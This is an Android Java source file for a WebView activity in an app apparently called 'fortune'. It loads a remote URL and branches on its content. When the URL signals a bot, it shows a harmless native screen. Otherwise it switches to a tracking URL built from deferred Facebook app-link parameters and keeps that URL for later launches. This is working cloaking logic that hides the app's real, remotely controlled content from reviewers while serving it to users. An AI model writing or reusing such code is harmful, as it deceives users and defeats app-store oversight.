package com.mapplic.fortune.core;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebChromeClient;
import android.widget.FrameLayout;

import com.facebook.applinks.AppLinkData;
import com.mapplic.fortune.R;
import com.mapplic.fortune.logic.MainActivity;
import com.onesignal.OneSignal;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import im.delight.android.webview.AdvancedWebView;

public class WebViewActivity extends AppCompatActivity implements AdvancedWebView.Listener {

    //Todo: change start activity
    private Class appActivity = MainActivity.class;

    private AdvancedWebView webView;
    private SharedPreferences prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_webview);

        prefs = getSharedPreferences(Constants.PREFS_NAME, MODE_PRIVATE);
        initStatusBar();
        initWebView();
        if(isNetworkAvailable()) initUrl();
        else showAppUI();
    }

    public boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();

    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (event.getAction() == KeyEvent.ACTION_DOWN) {
            if (keyCode == KeyEvent.KEYCODE_BACK) {
                if (webView.canGoBack()) webView.goBack();
                return true;
            }
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    protected void onResume() {
        webView.onResume();
        super.onResume();
    }

    @Override
    protected void onPause() {
        webView.onPause();
        super.onPause();
    }

    @Override
    protected void onDestroy() {
        webView.onDestroy();
        super.onDestroy();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        webView.onActivityResult(requestCode, resultCode, data);
    }

    @Override
    public void onPageStarted(String url, Bitmap favicon) {
        if (url.contains(Constants.BOT)) showAppUI();
        else if(url.contains(Constants.NO_BOT)) showAds();
    }

    @Override
    public void onPageFinished(String url) { }

    @Override
    public void onPageError(int errorCode, String description, String failingUrl) { }

    @Override
    public void onDownloadRequested(String url, String suggestedFilename, String mimeType, long contentLength, String contentDisposition, String userAgent) { }

    @Override
    public void onExternalPageRequest(String url) {
        //showAppUI();
    }

    protected void showAppUI(){
        Intent intent = new Intent(this, appActivity);
        startActivity(intent);
        finish();
    }

    private void initStatusBar() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
            getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR);
        getWindow().setStatusBarColor(ContextCompat.getColor(this, R.color.white));
    }

    private void initWebView() {
        webView = findViewById(R.id.webView);
        webView.setListener(this, this);
        webView.setWebChromeClient(new ChromeClient());
        CookieManager.getInstance().setAcceptCookie(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
    }

    private void initUrl() {
        String url2 = prefs.getString(Constants.PREFS_URL_GENERATED, "");
        if(!TextUtils.isEmpty(url2)) webView.loadUrl(url2);
        else webView.loadUrl(Constants.BASE_URL);
    }

    private void initOneSignalTags() {
        if (!prefs.getBoolean(Constants.PREFS_ONE_SIGNAL_TAG_SENT, false)) {
            OneSignal.sendTag(Constants.ONE_SIGNAL_TAG_NAME, Constants.ONE_SIGNAL_TAG_VALUE);
            prefs.edit().putBoolean(Constants.PREFS_ONE_SIGNAL_TAG_SENT, true).apply();
        }
    }

    private void showAds() {
        initOneSignalTags();
        AppLinkData.fetchDeferredAppLinkData(getApplicationContext(), appLinkData -> {
            if (appLinkData != null && appLinkData.getTargetUri() != null && !TextUtils.isEmpty(appLinkData.getTargetUri().toString())) {
                String params = Utils.getUrlParams(appLinkData.getTargetUri().toString());
                String finalUrl = Constants.TRACKING_URL + "&" + params;
                prefs.edit().putString(Constants.PREFS_URL_GENERATED, finalUrl).apply();
                webView.post(() -> webView.loadUrl(finalUrl));
            }
            else webView.post(() -> webView.loadUrl(Constants.TRACKING_URL));
        });
    }

    private class ChromeClient extends WebChromeClient {

        private View mCustomView;
        private WebChromeClient.CustomViewCallback mCustomViewCallback;
        private int mOriginalOrientation;
        private int mOriginalSystemUiVisibility;

        public Bitmap getDefaultVideoPoster() {
            if (mCustomView == null) return null;
            return BitmapFactory.decodeResource(getApplicationContext().getResources(), 2130837573);
        }

        public void onHideCustomView() {
            ((FrameLayout) getWindow().getDecorView()).removeView(this.mCustomView);
            this.mCustomView = null;
            getWindow().getDecorView().setSystemUiVisibility(this.mOriginalSystemUiVisibility);
            setRequestedOrientation(this.mOriginalOrientation);
            this.mCustomViewCallback.onCustomViewHidden();
            this.mCustomViewCallback = null;
        }

        public void onShowCustomView(View paramView, WebChromeClient.CustomViewCallback paramCustomViewCallback) {
            if (this.mCustomView != null) {
                onHideCustomView();
                return;
            }
            this.mCustomView = paramView;
            this.mOriginalSystemUiVisibility = getWindow().getDecorView().getSystemUiVisibility();
            this.mOriginalOrientation = getRequestedOrientation();
            this.mCustomViewCallback = paramCustomViewCallback;
            ((FrameLayout) getWindow().getDecorView()).addView(this.mCustomView, new FrameLayout.LayoutParams(-1, -1));
            getWindow().getDecorView().setSystemUiVisibility(3846 | View.SYSTEM_UI_FLAG_LAYOUT_STABLE);
        }

        private void printFacebookKeyHash() {
            try {
                PackageInfo info = getPackageManager().getPackageInfo(
                        getPackageName(),
                        PackageManager.GET_SIGNATURES);
                for (Signature signature : info.signatures) {
                    MessageDigest md = MessageDigest.getInstance("SHA");
                    md.update(signature.toByteArray());
                    Log.d("KeyHash:", Base64.encodeToString(md.digest(), Base64.DEFAULT));
                }
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();

            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
            }
        }
    }
}
